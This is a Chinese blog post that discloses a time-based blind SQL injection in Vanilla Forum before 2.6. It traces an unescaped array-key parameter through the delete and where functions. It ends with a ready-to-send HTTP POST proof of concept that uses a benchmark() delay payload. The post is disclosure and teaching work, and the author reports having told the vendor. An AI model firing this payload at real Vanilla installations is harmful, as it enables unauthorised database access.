---
layout: post
title: Vanilla SQL Injection Vulnerability
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - Balis0ng</p>

## 简介

&nbsp;&nbsp;&nbsp;Vanilla是国外的一个论坛程序，是一款开源的PHP程序。github地址为:https://github.com/vanilla/vanilla 在Vanilla Forum 2.6之前，存在一个SQL注入漏洞，攻击者只需要注册登录一个会员即可利用该漏洞。

## 漏洞分析

首先在applications/dashboard/controllers/class.profilecontroller.php:274

{% highlight javascript %}

public function deleteInvitation($invitationID) {
        $this->permission('Garden.SignIn.Allow');

        if (!$this->Form->authenticatedPostBack()) {
            throw forbiddenException('GET');
        }

        $invitationModel = new InvitationModel();
        $invitationModel->delete($invitationID);
        $this->informMessage(t('The invitation was removed successfully.'));
        $this->jsonTarget(".js-invitation[data-id=\"{$invitationID}\"]", '', 'SlideUp');

        $this->render('Blank', 'Utility');
    }
{% endhighlight %}

这个函数有个形参$invitationID，这个值其实是我们通过URL传递进来的，是我们可控的，并且这里需要注意的是，该值是可以为一个数组。

首先该函数第一行判断了权限，需要登录。

第二行是一个csrf token的判断，利用这个漏洞不能直接发POST包。

然后下面就到了关键的地方，可以看到这里将$invitationID带入到了delete函数中，我们跟踪一下该函数。

applications/dashboard/models/class.invitationmodel.php:225

{% highlight javascript %}

public function delete($where = [], $options = []) {
    if (is_numeric($where)) {
        deprecated('InvitationModel->delete(int)', 'InvitationModel->deleteID(int)');
        $result = $this->deleteID($where, $options);
        return $result;
    }
    parent::delete($where, $options);
}
{% endhighlight %}

&nbsp;&nbsp;&nbsp;这里的参数$where就是我们上文的$invitationID，是可控的，然后这里又将$where带入到了另外一个delete函数中，继续追踪。

{% highlight javascript %}

public function delete($where = [], $options = []) {
    if (is_numeric($where)) {
        deprecated('Gdn_Model->delete(int)', 'Gdn_Model->deleteID()');
        $where = [$this->PrimaryKey => $where];
    }

    $resetData = false;
    if ($options === true || val('reset', $options)) {
        deprecated('Gdn_Model->delete() with reset true');
        $resetData = true;
    } elseif (is_numeric($options)) {
        deprecated('The $limit parameter is deprecated in Gdn_Model->delete(). Use the limit option.');
        $limit = $options;
    } else {
        $options += ['rest' => true, 'limit' => null];
        $limit = $options['limit'];
    }

    if ($resetData) {
        $result = $this->SQL->delete($this->Name, $where, $limit);
    } else {
        $result = $this->SQL->noReset()->delete($this->Name, $where, $limit);
    }
    return $result;
}
{% endhighlight %}

然后该函数中又将$where带入到了$this->SQL->noReset()->delete函数中，继续追踪。

library/database/class.sqldriver.php:333

{% highlight javascript %}

public function delete($table = '', $where = '', $limit = false) {
	if ($table == '') {
	    if (!isset($this->_Froms[0])) {
	        return false;
	    }

	    $table = $this->_Froms[0];
	} elseif (is_array($table)) {
	    foreach ($table as $t) {
	        $this->delete($t, $where, $limit, false);
	    }
	    return;
	} else {
	    $table = $this->escapeIdentifier($this->Database->DatabasePrefix.$table);
	}

	if ($where != '') {
	    $this->where($where);
	}

	if ($limit !== false) {
	    $this->limit($limit);
	}

	if (count($this->_Wheres) == 0) {
	    return false;
	}

	$sql = $this->getDelete($table, $this->_Wheres, $this->_Limit);

	return $this->query($sql, 'delete');
	}
{% endhighlight %}

&nbsp;&nbsp;&nbsp;该函数中对我们传递进来的$where有个判断和操作，如果不为空，就带入到where函数中去，跟踪一下该函数。

{% highlight javascript %}

public function where($field, $value = null, $escapeFieldSql = true, $escapeValueSql = true) {
    if (!is_array($field)) {
        $field = [$field => $value];
    }

    foreach ($field as $subField => $subValue) {
        if (is_array($subValue)) {
            if (count($subValue) == 1) {
                $firstVal = reset($subValue);
                $this->where($subField, $firstVal);
            } else {
                $this->whereIn($subField, $subValue);
            }
        } else {
            $whereExpr = $this->conditionExpr($subField, $subValue, $escapeFieldSql, $escapeValueSql);
            if (strlen($whereExpr) > 0) {
                $this->_where($whereExpr);
            }
        }
    }
    return $this;
}
{% endhighlight %}

&nbsp;&nbsp;&nbsp;这里其实就是一个组装where语句的函数，由于$where我们可控制，导致这里组装后的where语句的字段处也可以控制，所以就产生了一个SQL注入漏洞。

## 漏洞证明

&nbsp;&nbsp;&nbsp;该漏洞利用需要用户登陆，因为是论坛，所以注册登录不是什么难事。
开头提了一下，由于有CSRF TOKEN的校验，所以不能直接发POST包，但是我们可以随便点击论坛一个正常的POST请求，然后用Burpsuite来改即可。
这里我使用的是延时注入，用的是benchmark函数。不同环境的延时时间也不一样的。
附上POC:

{% highlight javascript %}

POST /profile/deleteInvitation?invitationID[1%3dbenchmark(40000000,sha(1))+and+1]=balisong HTTP/1.1
Host: localhost
Content-Length: 29
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://localhost
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://localhost/profile/
Accept-Language: zh-CN,zh;q=0.9
Cookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjkyMDE2NTAsImlhdCI6MTUyNjYwOTY1MCwic3ViIjo3fQ.of1gk2CHyzeomQNSMWz_8WXXi_FfCwKxyctVWZlemKI; Vanilla-Vv=1526609650; Vanilla-tk=caEyM0dSVZC0xDhU%3A7%3A1526609650%3Ab23a6efff2dd9f026ffa87db10ba4119
Connection: close

TransientKey=caEyM0dSVZC0xDhU
{% endhighlight %}

然后这里延时了9秒。如图所示:

<img src="https://i.loli.net/2018/11/30/5c01538e4cdf6.jpg">

## 结语

&nbsp;&nbsp;&nbsp;其实这种漏洞很常见，很多程序在处理SQL语句的时候，都采用的这种写法，当然这种写法是没错的。主要还是因为开发人员太信任外部的输入了。

该程序在该版本相同类型的漏洞还有一个，大家有兴趣的话可以自己找一找。(当然我已经提交给厂商啦。)